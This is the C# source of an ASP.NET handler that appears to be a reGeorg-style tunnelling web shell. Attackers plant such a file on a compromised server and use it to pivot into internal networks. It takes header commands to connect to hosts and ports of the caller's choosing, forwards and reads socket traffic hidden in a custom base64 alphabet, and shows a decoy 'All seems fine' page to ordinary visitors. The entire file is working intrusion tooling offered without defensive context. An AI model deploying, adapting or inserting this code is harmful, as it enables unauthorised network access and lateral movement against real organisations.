<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState
{
	
	public String StrTr(string input, string frm, string to)
	{
		String r = "";
		for(int i=0; i < input.Length; i++)
		{
			int index = frm.IndexOf(input[i]);
			if(index != -1)
				r += to[index];
			else
				r += input[i];
		}
		return r;
	}
	public void ProcessRequest (HttpContext context) {
		try
		{
			String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
			String de = "BASE64 CHARSLIST";
			if (context.Request.HttpMethod == "POST")
			{
				String cmd = context.Request.Headers.Get("X-CMD");
				if (cmd == "CONNECT")
				{
					try
					{
						String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(context.Request.Headers.Get("X-TARGET"), de, en)));
						String[] target_ary = target_str.Split('|');
						String target = target_ary[0];
						int port = int.Parse(target_ary[1]);
						IPAddress ip = IPAddress.Parse(target);
						System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
						Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						
						sender.Connect(remoteEP);
						sender.Blocking = false;
						context.Session["socket"] = sender;
						context.Response.AddHeader("X-STATUS", "OK");
					}
					catch (Exception ex)
					{
						context.Response.AddHeader("X-ERROR", ex.Message);
						context.Response.AddHeader("X-STATUS", "FAIL");
					}
				}
				else if (cmd == "DISCONNECT")
				{
					try
					{
						Socket s = (Socket)context.Session["socket"];
						s.Close();
					}
					catch (Exception ex)
					{

					}
					context.Session.Abandon();
					context.Response.AddHeader("X-STATUS", "OK");
				}
				else if (cmd == "FORWARD")
				{
					Socket s = (Socket)context.Session["socket"];
					try
					{
						int buffLen = context.Request.ContentLength;
						byte[] buff = new byte[buffLen];
						int c = 0;
						while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0)
						{
							string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
							s.Send(Convert.FromBase64String(b64));
						}
						context.Response.AddHeader("X-STATUS", "OK");
					}
					catch (Exception ex)
					{
						context.Response.AddHeader("X-ERROR", ex.Message);
						context.Response.AddHeader("X-STATUS", "FAIL");
					}
				}
				else if (cmd == "READ")
				{
					Socket s = (Socket)context.Session["socket"];
					try
					{
						int c = 0;
						byte[] readBuff = new byte[513];
						try
						{
							while ((c = s.Receive(readBuff)) > 0)
							{
								byte[] newBuff = new byte[c];
								System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
								string b64 = Convert.ToBase64String(newBuff);
								context.Response.BinaryWrite(System.Text.Encoding.Default.GetBytes(StrTr(b64, en, de)));
							}
							context.Response.AddHeader("X-STATUS", "OK");
						}
						catch (SocketException soex)
						{
							context.Response.AddHeader("X-STATUS", "OK");
							return;
						}

					}
					catch (Exception ex)
					{
						context.Response.AddHeader("X-ERROR", ex.Message);
						context.Response.AddHeader("X-STATUS", "FAIL");
					}
				}
			} else {
				context.Response.Write("Georg says, 'All seems fine'");
			}
		}
		catch (Exception exKak)
		{
			context.Response.AddHeader("X-ERROR", exKak.Message);
			context.Response.AddHeader("X-STATUS", "FAIL");
		}
	}
 
	public bool IsReusable {
		get {
			return false;
		}
	}

}
